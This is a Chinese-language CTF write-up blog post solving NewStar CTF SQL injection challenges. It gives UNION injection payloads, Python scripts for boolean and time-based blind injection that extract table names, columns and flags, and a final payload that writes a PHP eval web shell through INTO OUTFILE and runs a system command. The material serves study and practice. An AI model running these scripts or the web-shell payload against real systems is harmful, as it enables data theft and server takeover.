---
title: newstar ctf复现
date: 2024-12-02 18:48:16
comments: true
description: 学习记录
categories:
- sql注入基础知识
- sqlmap基本使用
tags:
- sql语言
---

# newstar ctf复现

## week1让我皮蛋看看 flag 都藏哪了

在输入框输入`1 and 1=1`和`1 and 1=2`，发现第二次输入没有显示

说明是数字型注入，这里使用UNION注入

先看看列数多少

`1 ORDER BY 2`正确显示

`1 ORDER BY 3`报错

列数为2

判断回显位置

`-1 UNION SELECT 1,2`

返回

```
Name: "1"
Position: "2"
```

可以爆表了

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --所有表单名字
-1 union select 1,group_concat(column_name)from information_schema.columns where table_name='Fl4g' --所有列名
-1 union select 1,group_concat(0x5c,id,0x5c,des,0x5c,value) from Fl4g --返回列中所有数据
```

最终返回
```
Name: "1"
Position: "\5555\C0ngratu1ati0ns!\flag{NEw5T@r_ctf-Z024e497421ed64}"
```

flag即出

## week3-blindsql1

在输入框输入Alice能够返回成绩

加入单引号查询失败，再试试别的

```
Alice and 1=1
Alice and 1=2
```

提示空格被禁用

多次尝试发现只能盲注，可以试试插入 and 0 或者 and 1来控制返回情况，这就是布尔盲注

这里直接引用题解wp的爆破表名的py脚本

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        # 这条语句能查询到当前数据库所有的表名
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取所有表名的第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

得到一大堆表名里面有个secrets，直接尝试爆它列名

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破列名flag的内容

```python
import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

搞了半天终于憋出来一个flag

flag{N3wSTar_ctF_Z0Z4171df39d1dc3}

## week4-blindsql2

一眼时间盲注，不用试探了，直接上脚本sleep试

爆表名(直接用wp的)

```python
import requests, string, time

url = 'http://127.0.0.1:2987/'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:', c)

        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

爆它secrets列名

```php
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:' ,c)

        columns = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({columns},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

爆它flag

```python
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+] bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] trying:', c)

        flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({flag},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*] bingo:', c)
            result += c
            print(result)
            break
```

代码逻辑跟布尔盲注的没差多少，就把返回的逻辑判断改为响应时间长短来确定字符的正确

## week5-sqlshell

这个sql注入一眼看到就傻了，不在数据库那怎么办

这个题目涉及了一句话木马(web shell)知识

题目为sqlshell，说明我们要利用文件上传(INTO OUTFILE,将查询结果写入服务器上的指定文件)漏洞

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```

# php反序列化


